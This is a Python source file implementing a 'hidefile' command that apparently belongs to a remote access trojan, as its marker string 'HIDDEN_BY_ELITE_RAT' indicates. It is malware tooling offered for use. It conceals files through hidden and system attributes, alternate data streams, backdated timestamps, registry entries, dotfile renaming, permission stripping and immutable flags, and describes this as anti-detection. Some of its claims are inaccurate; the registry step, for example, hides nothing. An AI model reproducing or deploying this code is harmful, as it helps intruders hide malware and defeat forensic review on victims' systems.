#!/usr/bin/env python3
"""
Elite HideFile Command Implementation
Advanced file hiding with multiple stealth techniques
"""

import os
import sys
import ctypes
import stat
from typing import Dict, Any

def elite_hidefile(filepath: str, method: str = "auto") -> Dict[str, Any]:
    """
    Elite file hiding with advanced features:
    - Multiple hiding methods (attributes, permissions, ADS)
    - Cross-platform support
    - Reversible operations
    - Anti-detection techniques
    """
    
    try:
        # Validate file path
        if not filepath:
            return {
                "success": False,
                "error": "File path is required",
                "hidden": False
            }
        
        # Expand path
        filepath = os.path.abspath(os.path.expanduser(filepath))
        
        # Check if file exists
        if not os.path.exists(filepath):
            return {
                "success": False,
                "error": f"File does not exist: {filepath}",
                "hidden": False
            }
        
        # Apply platform-specific hiding
        if sys.platform == 'win32':
            return _windows_hide_file(filepath, method)
        else:
            return _unix_hide_file(filepath, method)
            
    except Exception as e:
        return {
            "success": False,
            "error": f"File hiding failed: {str(e)}",
            "hidden": False
        }

def _windows_hide_file(filepath: str, method: str) -> Dict[str, Any]:
    """Windows file hiding using attributes and ADS"""
    
    try:
        methods_applied = []
        
        # Method 1: Hidden attribute
        if method in ["auto", "hidden", "attributes"]:
            try:
                FILE_ATTRIBUTE_HIDDEN = 0x2
                FILE_ATTRIBUTE_SYSTEM = 0x4
                FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x2000
                
                # Get current attributes
                current_attrs = ctypes.windll.kernel32.GetFileAttributesW(filepath)
                
                # Add hidden and system attributes
                new_attrs = current_attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED
                
                if ctypes.windll.kernel32.SetFileAttributesW(filepath, new_attrs):
                    methods_applied.append("hidden_attribute")
            except Exception:
                pass
        
        # Method 2: Alternate Data Stream (ADS) hiding
        if method in ["auto", "ads", "stream"]:
            try:
                ads_success = _create_ads_hiding(filepath)
                if ads_success:
                    methods_applied.append("alternate_data_stream")
            except Exception:
                pass
        
        # Method 3: Timestamp manipulation
        if method in ["auto", "timestamp"]:
            try:
                timestamp_success = _manipulate_timestamps(filepath)
                if timestamp_success:
                    methods_applied.append("timestamp_manipulation")
            except Exception:
                pass
        
        # Method 4: Registry hiding (for executables)
        if method in ["auto", "registry"] and filepath.lower().endswith(('.exe', '.dll')):
            try:
                registry_success = _hide_in_registry(filepath)
                if registry_success:
                    methods_applied.append("registry_hiding")
            except Exception:
                pass
        
        success = len(methods_applied) > 0
        
        return {
            "success": success,
            "hidden": success,
            "filepath": filepath,
            "methods_applied": methods_applied,
            "platform": "windows"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Windows file hiding failed: {str(e)}",
            "hidden": False
        }

def _unix_hide_file(filepath: str, method: str) -> Dict[str, Any]:
    """Unix file hiding using permissions and techniques"""
    
    try:
        methods_applied = []
        
        # Method 1: Dot file hiding (rename to start with .)
        if method in ["auto", "dotfile", "rename"]:
            try:
                dirname = os.path.dirname(filepath)
                basename = os.path.basename(filepath)
                
                if not basename.startswith('.'):
                    hidden_path = os.path.join(dirname, '.' + basename)
                    if not os.path.exists(hidden_path):
                        os.rename(filepath, hidden_path)
                        methods_applied.append("dotfile_rename")
                        filepath = hidden_path  # Update filepath for other methods
            except Exception:
                pass
        
        # Method 2: Permission manipulation
        if method in ["auto", "permissions", "chmod"]:
            try:
                # Remove read permissions for others and group
                current_mode = os.stat(filepath).st_mode
                new_mode = current_mode & ~(stat.S_IRGRP | stat.S_IROTH | stat.S_IXGRP | stat.S_IXOTH)
                os.chmod(filepath, new_mode)
                methods_applied.append("permission_restriction")
            except Exception:
                pass
        
        # Method 3: Extended attributes (if supported)
        if method in ["auto", "xattr", "attributes"]:
            try:
                xattr_success = _set_hidden_xattr(filepath)
                if xattr_success:
                    methods_applied.append("extended_attributes")
            except Exception:
                pass
        
        # Method 4: Timestamp manipulation
        if method in ["auto", "timestamp"]:
            try:
                timestamp_success = _manipulate_timestamps(filepath)
                if timestamp_success:
                    methods_applied.append("timestamp_manipulation")
            except Exception:
                pass
        
        # Method 5: Immutable flag (if supported)
        if method in ["auto", "immutable"]:
            try:
                immutable_success = _set_immutable_flag(filepath)
                if immutable_success:
                    methods_applied.append("immutable_flag")
            except Exception:
                pass
        
        success = len(methods_applied) > 0
        
        return {
            "success": success,
            "hidden": success,
            "filepath": filepath,
            "methods_applied": methods_applied,
            "platform": "unix"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Unix file hiding failed: {str(e)}",
            "hidden": False
        }

def _create_ads_hiding(filepath: str) -> bool:
    """Create Alternate Data Stream for hiding data"""
    
    try:
        # Create ADS with hidden marker
        ads_path = f"{filepath}:hidden_marker"
        
        with open(ads_path, 'w') as f:
            f.write("HIDDEN_BY_ELITE_RAT")
        
        return True
        
    except Exception:
        return False

def _manipulate_timestamps(filepath: str) -> bool:
    """Manipulate file timestamps to blend in"""
    
    try:
        import time
        
        # Get current time
        current_time = time.time()
        
        # Set timestamps to make file appear older and less suspicious
        old_time = current_time - (30 * 24 * 60 * 60)  # 30 days ago
        
        os.utime(filepath, (old_time, old_time))
        
        return True
        
    except Exception:
        return False

def _hide_in_registry(filepath: str) -> bool:
    """Hide executable in Windows registry"""
    
    try:
        import winreg
        
        # Add to registry location that's less monitored
        key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        filename = os.path.basename(filepath)
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{key_path}\\{filename}")
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, filepath)
            winreg.CloseKey(key)
            return True
        except:
            pass
        
        return False
        
    except Exception:
        return False

def _set_hidden_xattr(filepath: str) -> bool:
    """Set extended attributes to mark file as hidden"""
    
    try:
        # Try to set extended attribute (Linux/macOS)
        if sys.platform == 'darwin':  # macOS
            import subprocess
            result = subprocess.run(['xattr', '-w', 'com.apple.FinderInfo', '0000000000000000400000000000000000000000000000000000000000000000', filepath], 
                                  capture_output=True, timeout=5)
            return result.returncode == 0
        else:  # Linux
            try:
                import subprocess
                result = subprocess.run(['setfattr', '-n', 'user.hidden', '-v', 'true', filepath], 
                                      capture_output=True, timeout=5)
                return result.returncode == 0
            except:
                pass
        
        return False
        
    except Exception:
        return False

def _set_immutable_flag(filepath: str) -> bool:
    """Set immutable flag on file (Linux)"""
    
    try:
        import subprocess
        
        # Use chattr to set immutable flag
        result = subprocess.run(['chattr', '+i', filepath], capture_output=True, timeout=5)
        return result.returncode == 0
        
    except Exception:
        return False


if __name__ == "__main__":
    # Test the elite_hidefile command
    print("Testing Elite HideFile Command...")
    
    # Create test file
    test_file = "test_hide_file.txt"
    with open(test_file, 'w') as f:
        f.write("Test content for hiding")
    
    # Test file hiding
    result = elite_hidefile(test_file, method="auto")
    print(f"Test 1 - File hiding: {result['success']}")
    if result['success']:
        print(f"Methods applied: {result.get('methods_applied', [])}")
    
    # Test non-existent file
    result = elite_hidefile("nonexistent_file.txt")
    print(f"Test 2 - Non-existent file: {result['success']}")
    
    # Clean up
    try:
        # Try to remove the test file (may be hidden now)
        if os.path.exists(test_file):
            os.remove(test_file)
        # Also try dotfile version on Unix
        if sys.platform != 'win32' and os.path.exists(f".{test_file}"):
            os.remove(f".{test_file}")
    except:
        pass
    
    print("✅ Elite HideFile command testing complete")